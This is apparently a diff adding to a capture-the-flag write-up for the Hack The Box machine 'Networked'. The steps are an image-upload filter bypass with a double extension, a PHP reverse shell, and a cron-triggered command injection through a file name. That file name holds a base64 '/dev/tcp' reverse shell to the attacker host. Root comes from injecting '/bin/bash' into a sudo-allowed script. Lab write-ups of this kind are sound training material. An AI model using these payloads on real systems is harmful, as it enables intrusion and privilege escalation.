@@ -349,24 +349,239 @@ if ($i < 4 && $i > 1) {
 </html>
 ```
 
-If we form a POST request that uploads reverse shell code by bypassing all the filters, we might be able to get access.
+I'm guessing that ```/upload.php``` is where we will be uploading our files.
+
+There it is.
+
+![5](Screenshots/Networked_5.jpg)
+
+We need to bypass all the filtering that is happening to upload reverse shell code, then figure out the naming mechanism to navigate to the file to get access.
 
 A prerequisite to that is to take a close look at the source code, particularly ```upload.php``` and ```lib.php``` to understand the filtering that is happening.
 
-Let's start with the functions defined in ```lib.php```.
+After taking a deep look into the source code, the validation measures in place seems to be a MIME type checking by analyzing magic bytes, and making sure that the file extension ends in ```.jpg```, ```.png```, ```.gif```, and ```.jpg``` to ensure the uploaded file is an image.
 
+To bypass this, we need to insert magic bytes for an image file type, then make sure our file name ends with the image extensions but adding ```.php``` beforehand. The filtering mechanism doesn't seem to have additional checks on ```.php``` file extensions. We can make our file extension something like ```.php.jpg``` to have the server still execute our code.
 
+For the naming convention, it seems to take our remote IP address, replace the ```.``` in the IP with ```_```, then append the file extension to it. So since our attack box IP is ```10.10.15.194```, our uploaded file will be located at ```http://10.129.63.26/uploads/10_10_15_194.php.jpg```.
 
+I first uploaded a valid image file, just to see if my guess on the naming mechanism was correct.
 
+![6](Screenshots/Networked_6.jpg)
 
+Navigating to the file name, it confirms my guess. The image itself is not appearing because I cut the majority of the image content in Burp to get through the file size checking, but the file exists on the server.
 
+![7](Screenshots/Networked_7.jpg)
 
+Finally, let's send our reverse shell code.
 
+Successfully uploaded!
 
+![8](Screenshots/Networked_8.jpg)
 
+Let's now open up a netcat listener and navigate to the file, hoping the php code gets executed and we get a connection back.
 
+There it is.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dmk8phjrwb]─[~]
+└──╼ [★]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.63.26 35186
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 20:54:10 up  1:54,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ 
+```
+
+We don't have permissions to read the user flag, but we do find two interesting files in the ```guly``` user's home directory: ```crontab.guly``` and ```check_attack.php```
+
+Looking at ```crontab.guly```, we can see that ```check_attack.php``` is ran every three minutes.
+
+```
+cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+```
+
+```check_attack.php``` checks the IP address that uploaded files to the server, but that is irrelevant.
+
+This line in the script is interesting: ```exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");```. The ```$path``` variable is set at the top, but ```$value``` is set by the script scanning files in the uploads directory without any validation. We could inject a fake file with the file name being a command, having the cron job execute the command for us. We could get a reverse shell connection as the ```guly``` user. However, since file names cannot contain the ```/``` character, we should base64 encode our payload.
+
+```
+sh-4.2$ echo -n 'sh -i >& /dev/tcp/10.10.15.194/4445 0>&1' | base64 -w0      
+echo -n 'sh -i >& /dev/tcp/10.10.15.194/4445 0>&1' | base64 -w0
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk0LzQ0NDUgMD4mMQ==sh-4.2$
+```
+
+Let's see if our payload works. We take the base64 encoded string, decode it, then pipe it through bash to run it.
+
+```
+sh-4.2$ echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk0LzQ0NDUgMD4mMQ== | base64 -d | sh
+```
+
+We do get a shell back, confirming that our payload works.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dmk8phjrwb]─[~]
+└──╼ [★]$ nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.129.63.26 43954
+sh: no job control in this shell
+sh-4.2$ 
+```
+
+Let's put it all together. We make a dummy file containing the intended ```$value``` variable to store the file name, which is the command that we want to run. Then, we can wait for the cron job to run as ```guly``` and hopefully get a shell as the user.
+
+```
+sh-4.2$ touch '; echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk0LzQ0NDUgMD4mMQ== | base64 -d | sh' 
+<WkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk0LzQ0NDUgMD4mMQ== | base64 -d | sh'       
+sh-4.2$ ls -la
+ls -la
+total 36
+drwxrwxrwx. 2 root   root   4096 Sep 13 21:29 .
+drwxr-xr-x. 4 root   root   4096 Jul  9  2019 ..
+-rw-r--r--  1 apache apache   19 Sep 13 20:50 10_10_15_194.jpg
+-rw-r--r--  1 apache apache 3625 Sep 13 20:52 10_10_15_194.php.jpg
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
+-rw-rw-rw-  1 apache apache    0 Sep 13 21:29 ; echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk0LzQ0NDUgMD4mMQ== | base64 -d | sh
+-r--r--r--. 1 root   root      2 Oct 30  2018 index.html
+```
+
+We got it.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dmk8phjrwb]─[~]
+└──╼ [★]$ nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.129.63.26 43958
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+guly
+```
+
+We can proceed to get the user flag from here.
 
 ## Root Flag
+
+It seems like we can run a script as root without a password.
+
+```
+sh-4.2$ sudo -l
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+
+Let's look at what this script does.
+
+```
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		echo "interface $var:"
+		read x
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+```
+
+This script seems to be reading user input from the terminal to write in variable names for the ```/etc/sysconfig/network-scripts/ifcfg-guly```, then running the ```/sbin/ifup``` binary.
+
+Here is my attempt on running the script. I put ```/bin/bash``` for the name so that maybe the script can execute it, but it didn't work.
+
+```
+sh-4.2$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+/bin/bash
+interface PROXY_METHOD:
+a
+interface BROWSER_ONLY:
+a
+interface BOOTPROTO:
+a
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
+```
+
+However, the change was reflected on the file.
+
+Playing around with the inputs, I noticed an interesting pattern.
+
+```
+sh-4.2$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+hi a
+interface PROXY_METHOD:
+lol hi
+interface BROWSER_ONLY:
+lmao lol
+interface BOOTPROTO:
+rofl lmao
+/etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 5: hi: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 6: lol: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 7: lmao: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 5: hi: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 6: lol: command not found
+/etc/sysconfig/network-scripts/ifcfg-guly: line 7: lmao: command not found
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
+```
+
+It seems like for every input in a variable, the ```/sbin/ifup``` binary runs the string after a space as a command. If we put ```/bin/bash``` after a space, we might get ```root``` access.
+
+Let's try it.
+
+```
+sh-4.2$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+hi /bin/bash
+interface PROXY_METHOD:
+hi
+interface BROWSER_ONLY:
+hi
+interface BOOTPROTO:
+hi
+whoami
+root
+```
+
+It worked. We can proceed to get the root flag from here.
+
+Nice pwn!
 
 ## Contact
 
